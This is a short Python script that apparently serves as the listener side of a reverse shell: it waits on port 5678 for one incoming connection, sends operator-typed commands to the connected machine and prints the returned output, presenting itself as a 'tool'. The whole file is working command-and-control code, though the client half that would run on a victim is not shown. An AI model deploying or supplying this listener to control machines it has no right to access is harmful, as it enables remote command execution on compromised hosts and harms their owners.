import socket


SERVER_IP = "0.0.0.0"
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    s.listen(1)

    print("[+] Server listening...")

    conn, addr = s.accept()

    print(f"[+] Connection established from: {addr}")

    try:
        with conn:
            # conn.send(b"Hello World")
            while True:
                command = input("Enter command: ")
                if command:
                    if command == "exito":
                        print("[+] Thanks for using this tool.")
                        break
                    command = command.encode()
                    conn.send(command)
                    print("[+] Command sent")
                    output = conn.recv(999999999)
                    output = output.decode()
                    print(f"[-] Output: {output}")

                else:
                    continue

    except:
        print("[+] Connection lost")